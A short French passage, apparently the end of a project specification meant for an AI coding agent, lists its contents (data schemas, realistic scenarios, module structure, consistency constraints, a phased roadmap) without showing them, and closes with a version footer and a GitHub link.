*Document version : 1.0*
*Dernière mise à jour : 2026-03-06*
*Auteur : Architecture DzolaCyber*
```

Ce `project.md` est structuré pour être donné à un agent IA d'implémentation (comme OpenCode ou Cursor). Il contient :

1. **Tous les schémas de données détaillés** pour chaque source (interne/externe)
2. **Les scénarios complets** avec timelines réalistes
3. **L'architecture du module** (structure de fichiers)
4. **Les contraintes de cohérence** critiques pour des données réalistes
5. **Une roadmap d'implémentation** par phases

L'agent IA pourra directement utiliser ce document pour générer le code Python correspondant.

# https://github.com/mindsdb/anton